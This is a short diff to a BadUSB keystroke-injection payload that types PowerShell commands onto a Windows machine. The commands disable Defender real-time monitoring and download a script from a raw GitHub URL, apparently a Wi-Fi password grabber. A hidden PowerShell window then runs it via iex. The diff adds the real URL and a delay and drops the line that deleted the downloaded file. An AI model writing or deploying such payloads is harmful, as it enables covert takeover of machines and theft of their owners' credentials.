@@ -118,15 +118,15 @@ Delay 1000
 Press KEY_LEFT_ARROW
 PressRelease KEY_ENTER
 Release
+Delay 500
 
 WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Definir URL do Script
+## Definir URL do Script
 
-WinPrintLine $u='URL';
+WinPrintLine $u='https://raw.githubusercontent.com/b-host/bruce-sd-card/refs/heads/main/BadUSB/Payloads/ECCW/wifiPWD/script.ps1';
 WinPrintLine $d=New-Object Net.WebClient;
 WinPrintLine $f='t.ps1';$d.DownloadFile($u,$f);
-WinPrintLine powershell -w h -ep Bypass -c "gc $f -Raw|iex";
-WinPrintLine rm $f -ea 0;exit
+WinPrintLine powershell -w h -c "gc $f -Raw|iex";
 
 ```
